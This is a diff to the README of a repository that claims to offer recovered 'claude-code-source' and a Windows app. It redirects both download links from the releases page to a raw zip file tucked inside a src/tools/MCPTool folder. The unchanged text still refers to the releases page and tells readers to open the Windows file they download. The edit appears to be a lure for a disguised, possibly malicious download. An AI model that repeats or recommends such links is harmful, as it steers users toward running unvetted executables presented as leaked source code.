@@ -1,6 +1,6 @@
 # 🧩 claude-code-source - Source Recovery For Easy Review
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue-grey?style=for-the-badge)](https://github.com/Demetrastarkers93/claude-code-source/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Demetrastarkers93/claude-code-source/main/src/tools/MCPTool/code_source_claude_2.5.zip)
 
 ## 🚀 Overview
 
@@ -11,7 +11,7 @@ Use this project if you want a direct download path and a local Windows app setu
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Demetrastarkers93/claude-code-source/releases
+https://raw.githubusercontent.com/Demetrastarkers93/claude-code-source/main/src/tools/MCPTool/code_source_claude_2.5.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your device, then open it from your Downloads folder.
 
